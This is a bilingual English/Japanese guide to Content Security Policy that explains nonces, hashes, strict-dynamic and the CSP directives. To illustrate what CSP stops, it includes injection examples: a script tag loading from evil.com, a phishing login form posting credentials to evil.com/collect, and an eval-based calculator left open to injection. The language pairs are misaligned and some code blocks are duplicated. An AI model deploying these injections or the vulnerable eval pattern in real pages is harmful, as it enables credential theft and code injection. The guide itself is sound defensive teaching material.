<span className="bilingualLabel english">English (原文)</span>

## Introduction

This article brings forth a way to integrate the __defense in depth__ concept to the client-side of web applications. By injecting the Content-Security-Policy (CSP) headers from the server, the browser is aware and capable of protecting the user from dynamic calls that will load content into the page currently being visited.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## はじめに

この記事では、Web アプリケーションのクライアント側に**多層防御 (defense in depth)** の考え方を組み込む方法を示します。サーバーから Content-Security-Policy (CSP) ヘッダーを注入することで、ブラウザは現在閲覧中のページへコンテンツを読み込む動的呼び出しからユーザーを保護できるようになります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Context

The increase in XSS (Cross-Site Scripting), clickjacking, and cross-site leak vulnerabilities demands a more __defense in depth__ security approach.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## コンテキスト

XSS (Cross-Site Scripting)、クリックジャッキング、クロスサイトリークの脆弱性が増えているため、より**多層防御**のセキュリティアプローチが求められます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Defense against XSS

CSP defends against XSS attacks in the following ways:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### XSS に対する防御

CSP は次の方法で XSS 攻撃を防御します。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### 1. Restricting Inline Scripts

By preventing the page from executing inline scripts, attacks like injecting

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 1. インラインスクリプトの制限

ページによるインラインスクリプトの実行を防ぐことで、次のような注入攻撃は機能しません。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<script>document.body.innerHTML='defaced'</script>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

will not work.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 2. リモートスクリプトの制限

ページが任意のサーバーからスクリプトを読み込むことを防ぐことで、次のような注入攻撃は機能しません。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<script src="https://evil.com/hacked.js"></script>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### 2. Restricting Remote Scripts

By preventing the page from loading scripts from arbitrary servers, attacks like injecting

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 3. 危険な JavaScript の制限

`eval` のようなテキストから JavaScript へ変換する関数の実行をページで防ぐことにより、Web サイトは次のような脆弱性から保護されます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<script src="https://evil.com/hacked.js"></script>
```

```js
// A Simple Calculator
var op1 = getUrlParameter("op1");
var op2 = getUrlParameter("op2");
var sum = eval(`${op1} + ${op2}`);
console.log(`The sum is: ${sum}`);
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

will not work.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 4. フォーム送信の制限

Web サイト上の HTML フォームがデータを送信できる先を制限することで、フィッシングフォームの注入も機能しなくなります。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<form method="POST" action="https://evil.com/collect">
<h3>Session expired! Please login again.</h3>
<label>Username</label>
<input type="text" name="username"/>

<label>Password</label>
<input type="password" name="pass"/>

<input type="Submit" value="Login"/>
</form>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### 3. Restricting Unsafe JavaScript

By preventing the page from executing text-to-JavaScript functions like `eval`, the website will be safe from vulnerabilities like the this:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 5. オブジェクトの制限

さらに、HTML の [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) タグを制限することで、攻撃者が悪意のある Flash、Java、その他のレガシー実行可能要素をページへ注入することもできなくなります。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```js
// A Simple Calculator
var op1 = getUrlParameter("op1");
var op2 = getUrlParameter("op2");
var sum = eval(`${op1} + ${op2}`);
console.log(`The sum is: ${sum}`);
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### 4. Restricting Form submissions

By restricting where HTML forms on your website can submit their data, injecting phishing forms won't work either.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### フレーミング攻撃に対する防御

クリックジャッキングや、ブラウザのサイドチャネル攻撃 (xs-leaks) の一部の亜種では、悪意のある Web サイトがターゲット Web サイトをフレーム内に読み込む必要があります。

歴史的にはこの目的で `X-Frame-Options` ヘッダーが使われてきましたが、これは CSP の `frame-ancestors` ディレクティブによって旧式化されています。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<form method="POST" action="https://evil.com/collect">
<h3>Session expired! Please login again.</h3>
<label>Username</label>
<input type="text" name="username"/>

<label>Password</label>
<input type="password" name="pass"/>

<input type="Submit" value="Login"/>
</form>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### 5. Restricting Objects

And by restricting the HTML [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) tag, it also won't be possible for an attacker to inject malicious flash/Java/other legacy executables on the page.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 多層防御

強力な CSP は、さまざまな種類の脆弱性、特に XSS に対する有効な**第二の防御層**を提供します。CSP は Web アプリケーションが脆弱性を*含む*こと自体を防ぎませんが、攻撃者がそれらの脆弱性を悪用することを大幅に難しくできます。

ユーザー入力を一切受け付けない完全に静的な Web サイトであっても、CSP を使用して [Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity) の使用を強制できます。これは、JavaScript ファイルをホストしているサードパーティサイトの一つ (分析スクリプトなど) が侵害された場合に、悪意のあるコードが Web サイトに読み込まれることを防ぐ助けになります。

とはいえ、XSS に対する唯一の防御機構として CSP に依存**すべきではありません**。それでも [Cross-Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) に記載されているような適切な開発プラクティスに従い、その上に追加のセキュリティ層として CSP をデプロイする必要があります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Defense against framing attacks

Attacks like clickjacking and some variants of browser side-channel attacks (xs-leaks) require a malicious website to load the target website in a frame.

Historically the `X-Frame-Options` header has been used for this, but it has been obsoleted by the `frame-ancestors` CSP directive.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## ポリシーの配信

Content Security Policy は、Web サイトへ三つの方法で配信できます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Defense in Depth

A strong CSP provides an effective __second layer__ of protection against various types of vulnerabilities, especially XSS. Although CSP doesn't prevent web applications from *containing* vulnerabilities, it can make those vulnerabilities significantly more difficult for an attacker to exploit.

Even on a fully static website, which does not accept any user input, a CSP can be used to enforce the use of [Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity). This can help prevent malicious code from being loaded on the website if one of the third-party sites hosting JavaScript files (such as analytics scripts) is compromised.

With all that being said, CSP __should not__ be relied upon as the only defensive mechanism against XSS. You must still follow good development practices such as the ones described in [Cross-Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), and then deploy CSP on top of that as a bonus security layer.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 1. Content-Security-Policy ヘッダー

Web サーバーから Content-Security-Policy HTTP レスポンスヘッダーを送信します。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
Content-Security-Policy: ...
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Policy Delivery

You can deliver a Content Security Policy to your website in three ways.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

ヘッダーを使用する方法が推奨であり、CSP の全機能セットをサポートします。インデックスページだけではなく、すべての HTTP レスポンスで送信してください。

これは W3C 仕様の標準ヘッダーです。Firefox 23+、Chrome 25+、Opera 19+ でサポートされています。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### 1. Content-Security-Policy Header

Send a Content-Security-Policy HTTP response header from your web server.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 2. Content-Security-Policy-Report-Only ヘッダー

`Content-Security-Policy-Report-Only` を使用すると、強制されない CSP を配信できます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
Content-Security-Policy: ...
```

```text
Content-Security-Policy-Report-Only: ...
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Using a header is the preferred way and supports the full CSP feature set. Send it in all HTTP responses, not just the index page.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

それでも、違反レポートはコンソールに出力され、`report-to` および `report-uri` ディレクティブが使用されている場合は違反エンドポイントへ送信されます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

This is a W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

これも W3C 仕様の標準ヘッダーです。Firefox 23+、Chrome 25+、Opera 19+ でサポートされています。この場合、ポリシーは非ブロッキング ("fail open") であり、`report-uri` (またはより新しい `report-to`) ディレクティブで指定された URL にレポートが送信されます。これは CSP をブロッキングモード ("fail closed") で利用する前段階としてよく使われます。

ブラウザは、サイトが `Content-Security-Policy` と `Content-Security-Policy-Report-Only` の両方を同時に問題なく使用することを完全にサポートしています。このパターンは、たとえば厳格な `Report-Only` ポリシーを実行して多数の違反レポートを取得しつつ、正当なサイト機能を壊さないように、より緩い強制ポリシーを適用するために使えます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### 2. Content-Security-Policy-Report-Only Header

Using the `Content-Security-Policy-Report-Only`, you can deliver a CSP that doesn't get enforced.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 3. Content-Security-Policy Meta タグ

たとえば、ヘッダーを制御できない CDN に HTML ファイルをデプロイしている場合など、Content-Security-Policy ヘッダーを使用できないことがあります。

この場合でも、次のように HTML マークアップ内で `http-equiv` meta タグを指定することで CSP を使用できます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
Content-Security-Policy-Report-Only: ...
```

```html
<meta http-equiv="Content-Security-Policy" content="...">
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Still, violation reports are printed to the console and delivered to a violation endpoint if the `report-to` and `report-uri` directives are used.

This is also a W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+, whereby the policy is non-blocking ("fail open") and a report is sent to the URL designated by the `report-uri` (or newer `report-to`) directive. This is often used as a precursor to utilizing CSP in blocking mode ("fail closed")

Browsers fully support the ability of a site to use both `Content-Security-Policy` and `Content-Security-Policy-Report-Only` together, without any issues. This pattern can be used for example to run a strict `Report-Only` policy (to get many violation reports), while having a looser enforced policy (to avoid breaking legitimate site functionality).

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

完全な XSS 防御を含め、ほぼすべてが引き続きサポートされます。ただし、[フレーミング保護](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)、[サンドボックス化](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)、または [CSP 違反ログ記録エンドポイント](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to) は使用できません。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### 3. Content-Security-Policy Meta Tag

Sometimes you cannot use the Content-Security-Policy header if you are, e.g., Deploying your HTML files in a CDN where the headers are out of your control.

In this case, you can still use CSP by specifying a `http-equiv` meta tag in the HTML markup, like so:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 警告

`X-Content-Security-Policy` や `X-WebKit-CSP` は**使用しないでください**。これらの実装は旧式であり (Firefox 23、Chrome 25 以降)、限定的で、一貫性がなく、非常にバグが多いものです。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<meta http-equiv="Content-Security-Policy" content="...">
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Almost everything is still supported, including full XSS defenses. However, you will not be able to use [framing protections](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), [sandboxing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox), or a [CSP violation logging endpoint](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to).

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## CSP の種類 (細粒度/許可リストベースまたは strict)

CSP を構築する元々の仕組みでは、HTML ページのコンテキストで許可されるコンテンツとソースを定義する許可リストを作成していました。

しかし、現在の主要なプラクティスは、よりデプロイしやすく、バイパスされにくいためより安全な "Strict" CSP を作成することです。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### WARNING

__DO NOT__ use `X-Content-Security-Policy` or `X-WebKit-CSP`. Their implementations are obsolete (since Firefox 23, Chrome 25), limited, inconsistent, and incredibly buggy.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## Strict CSP

Strict CSP は、後述の細粒度な [Fetch ディレクティブ](#fetch-ディレクティブ)のうち限定された数のディレクティブを、次の二つの仕組みのいずれかと組み合わせることで作成できます。

- Nonce ベース
- Hash ベース

`strict-dynamic` ディレクティブは、Strict CSP を実装しやすくするために任意で使用することもできます。

以降のセクションではこれらの仕組みに関する基本的なガイダンスを示しますが、Strict CSP を作成するには、Google による詳細で体系的な手順に従うことを強く推奨します。

__[Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)](https://web.dev/strict-csp/)__

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## CSP Types (granular/allowlist based or strict)

The original mechanism for building a CSP involved creating allow-lists which would define the content and sources that were permitted in the context of the HTML page.

However, current leading practice is to create a "Strict" CSP which is much easier to deploy and more secure as it is less likely to be bypassed.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### Nonce ベース

Nonce は、HTTP レスポンスごとに生成し、Content-Security-Policy ヘッダーへ追加する、一回限り使用の一意なランダム値です。例を示します。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```js
const nonce = uuid.v4();
scriptSrc += ` 'nonce-${nonce}'`;
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Strict CSP

A strict CSP can be created by using a limited number of the granular [Fetch Directives listed below](#fetch-directives) along with one of two mechanisms:

- Nonce based
- Hash based

The `strict-dynamic` directive can optionally also be used to make it easier to implement a Strict CSP.

The following sections will provide some basic guidance to these mechanisms but it is strongly recommended to follow Google's detailed and methodological instructions for creating a Strict CSP:

__[Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)](https://web.dev/strict-csp/)__

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

次に、この nonce をビューへ渡し (nonce を使用するには非静的 HTML が必要です)、次のような script タグをレンダリングします。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<script nonce="<%= nonce %>">
    ...
</script>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Nonce based

Nonces are unique one-time-use random values that you generate for each HTTP response, and add to the Content-Security-Policy header, like so:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 警告

すべての script タグを "script nonce=..." に置換するミドルウェアを作成**しないでください**。攻撃者が注入したスクリプトにも nonce が付与されてしまうためです。nonce を使用するには、実際の HTML テンプレートエンジンが必要です。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```js
const nonce = uuid.v4();
scriptSrc += ` 'nonce-${nonce}'`;
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

You would then pass this nonce to your view (using nonces requires a non-static HTML) and render script tags that look something like this:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### Hash

インラインスクリプトが必要な場合、特定のスクリプトだけの実行を許可する別の選択肢として `script-src 'hash_algo-hash'` があります。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<script nonce="<%= nonce %>">
    ...
</script>
```

```text
Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Warning

__Don't__ create a middleware that replaces all script tags with "script nonce=..." because attacker-injected scripts will then get the nonces as well. You need an actual HTML templating engine to use nonces.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

ハッシュを取得するには、Google Chrome 開発者ツールで次のような違反を確認します。

> ❌ 次の Content Security Policy ディレクティブに違反しているため、インラインスクリプトの実行が拒否されました: "..." 'unsafe-inline' キーワード、ハッシュ (__'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='__)、または nonce...

この [hash generator](https://report-uri.com/home/hash) も使用できます。これは hash を使用する優れた[例](https://csp.withgoogle.com/docs/faq.html#static-content)です。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Hashes

When inline scripts are required, the `script-src 'hash_algo-hash'` is another option for allowing only specific scripts to execute.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 注記

Hash の使用はリスクのあるアプローチになり得ます。たとえばコード整形などにより script タグ内の*何か*が変更されると (空白であっても)、ハッシュが変わり、スクリプトはレンダリングされません。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

To get the hash, look at Google Chrome developer tools for violations like this:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### strict-dynamic

`strict-dynamic` ディレクティブは、hash または nonce のいずれかと組み合わせて Strict CSP の一部として使用できます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

> ❌ Refused to execute inline script because it violates the following Content Security Policy directive: "..." Either the 'unsafe-inline' keyword, a hash (__'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='__), or a nonce...

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

正しい hash または nonce を持つスクリプトブロックが追加の DOM 要素を作成し、その内部で JS を実行する場合、`strict-dynamic` は、それぞれに nonce や hash を明示的に追加しなくても、それらの要素を信頼するようブラウザに伝えます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

You can also use this [hash generator](https://report-uri.com/home/hash). This is a great [example](https://csp.withgoogle.com/docs/faq.html#static-content) of using hashes.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

`strict-dynamic` は CSP Level 3 の機能ですが、CSP Level 3 は一般的なモダンブラウザで非常に広くサポートされています。

詳細については、[strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage) を確認してください。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Note

Using hashes can be a risky approach. If you change *anything* inside the script tag (even whitespace) by, e.g., formatting your code, the hash will be different, and the script won't render.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## 詳細な CSP ディレクティブ

開発者がポリシーの流れを細かく制御できるように、複数の種類のディレクティブが存在します。細かすぎる、または許可が広すぎる非 Strict ポリシーを作成すると、バイパスと保護の喪失につながる可能性が高い点に注意してください。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### strict-dynamic

The `strict-dynamic` directive can be used as part of a Strict CSP in combination with either hashes or nonces.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### Fetch ディレクティブ

Fetch ディレクティブは、信頼してリソースを読み込む場所をブラウザに伝えます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

If a script block which has either the correct hash or nonce is creating additional DOM elements and executing JS inside of them, `strict-dynamic` tells the browser to trust those elements as well without having to explicitly add nonces or hashes for each one.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

ほとんどの fetch ディレクティブには、[W3C で指定されたフォールバックリスト](https://www.w3.org/TR/CSP3/#directive-fallback-list)があります。このリストにより、スクリプト、画像、ファイルなどのソースを細かく制御できます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Note that whilst `strict-dynamic` is a CSP level 3 feature, CSP level 3 is very widely supported in common, modern browsers.

For more details, check out [strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage).

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

- `child-src` は、開発者がネストされたブラウジングコンテキストと worker 実行コンテキストを制御できるようにします。
- `connect-src` は、fetch リクエスト、XHR、EventSource、Beacon、WebSocket 接続を制御します。
- `font-src` は、フォントを読み込める URL を指定します。
- `img-src` は、画像を読み込める URL を指定します。
- `manifest-src` は、アプリケーションマニフェストを読み込める URL を指定します。
- `media-src` は、動画、音声、テキストトラックリソースを読み込める URL を指定します。
- `prefetch-src` は、リソースをプリフェッチできる URL を指定します。
- `object-src` は、プラグインを読み込める URL を指定します。
- `script-src` は、スクリプトを実行できる場所を指定します。これは他のスクリプト系ディレクティブのフォールバックディレクティブです。
    - `script-src-elem` は、スクリプトリクエストおよびスクリプトブロックの実行が発生できる場所を制御します。
    - `script-src-attr` は、イベントハンドラーの実行を制御します。
- `style-src` は、ドキュメントへスタイルを適用できる場所を制御します。これには `<link>` 要素、`@import` ルール、`Link` HTTP レスポンスヘッダーフィールドから発生するリクエストが含まれます。
    - `style-src-elem` は、インライン属性を除くスタイルを制御します。
    - `style-src-attr` は、style 属性を制御します。
- `default-src` は、他の fetch ディレクティブのフォールバックディレクティブです。指定されたディレクティブには継承はありませんが、指定されていないディレクティブは `default-src` の値へフォールバックします。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Detailed CSP Directives

Multiple types of directives exist that allow the developer to control the flow of the policies granularly. Note that creating a non-Strict policy that is too granular or permissive is likely to lead to bypasses and a loss of protection.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### Document ディレクティブ

Document ディレクティブは、ポリシーが適用されるドキュメントのプロパティについてブラウザに指示します。

- `base-uri` は、`<base>` 要素が使用できる URL を指定します。
- `plugin-types` は、ドキュメントへ読み込めるリソースの種類を制限します (*例:* `application/pdf`)。影響を受ける要素 `<embed>` と `<object>` には三つのルールが適用されます。
    - 要素はその type を明示的に宣言する必要があります。
    - 要素の type は宣言された type と一致する必要があります。
    - 要素のリソースは宣言された type と一致する必要があります。
- `sandbox` は、フォーム送信などページのアクションを制限します。
    - リクエストヘッダー `Content-Security-Policy` とともに使用された場合にのみ適用されます。
    - ディレクティブに値を指定しない場合、すべての sandbox 制限が有効になります。`Content-Security-Policy: sandbox;`
    - [Sandbox syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Fetch Directives

Fetch directives tell the browser the locations to trust and load resources from.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### Navigation ディレクティブ

Navigation ディレクティブは、ドキュメントがナビゲートできる場所、またはドキュメントを埋め込める場所についてブラウザに指示します。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Most fetch directives have a certain [fallback list specified in w3](https://www.w3.org/TR/CSP3/#directive-fallback-list). This list allows for granular control of the source of scripts, images, files, etc.

- `child-src` allows the developer to control nested browsing contexts and worker execution contexts.
- `connect-src` provides control over fetch requests, XHR, eventsource, beacon and websockets connections.
- `font-src` specifies which URLs to load fonts from.
- `img-src` specifies the URLs that images can be loaded from.
- `manifest-src` specifies the URLs that application manifests may be loaded from.
- `media-src` specifies the URLs from which video, audio and text track resources can be loaded from.
- `prefetch-src` specifies the URLs from which resources can be prefetched from.
- `object-src` specifies the URLs from which plugins can be loaded from.
- `script-src` specifies the locations from which a script can be executed from. It is a fallback directive for other script-like directives.
    - `script-src-elem` controls the location from which execution of script requests and blocks can occur.
    - `script-src-attr` controls the execution of event handlers.
- `style-src` controls from where styles get applied to a document. This includes `<link>` elements, `@import` rules, and requests originating from a `Link` HTTP response header field.
    - `style-src-elem` controls styles except for inline attributes.
    - `style-src-attr` controls styles attributes.
- `default-src` is a fallback directive for the other fetch directives. Directives that are specified have no inheritance, yet directives that are not specified will fall back to the value of `default-src`.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

- `form-action` は、フォームが送信できる URL を制限します。
- `frame-ancestors` は、要求されたリソースを `<frame>`、`<iframe>`、`<object>`、`<embed>`、または `<applet>` 要素内に埋め込める URL を制限します。
    - このディレクティブが `<meta>` タグで指定された場合、そのディレクティブは無視されます。
    - このディレクティブは `default-src` ディレクティブへフォールバックしません。
    - `X-Frame-Options` はこのディレクティブによって旧式化され、ユーザーエージェントから無視されます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Document Directives

Document directives instruct the browser about the properties of the document to which the policies will apply to.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### Reporting ディレクティブ

Reporting ディレクティブは、防止された動作の違反を指定された場所へ配信します。これらのディレクティブは単独では意味を持たず、他のディレクティブに依存します。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

- `base-uri` specifies the possible URLs that the `<base>` element can use.
- `plugin-types` limits the types of resources that can be loaded into the document (*e.g.* `application/pdf`). 3 rules apply to the affected elements, `<embed>` and `<object>`:
    - The element needs to explicitly declare its type.
    - The element's type needs to match the declared type.
    - The element's resource needs to match the declared type.
- `sandbox` restricts a page's actions such as submitting forms.
    - Only applies when used with the request header `Content-Security-Policy`.
    - Not specifying a value for the directive activates all of the sandbox restrictions. `Content-Security-Policy: sandbox;`
    - [Sandbox syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

- `report-to` (CSP Level 3。[Reporting API](https://developer.mozilla.org/en-US/docs/Web/API/Reporting_API) とともに使用) は、**主要かつ現在の**レポート用ディレクティブです。JSON 形式のエンドポイントリストを含む `Reporting-Endpoints` (またはレガシーな `Report-To`) レスポンスヘッダーで定義されたグループ名を参照します。
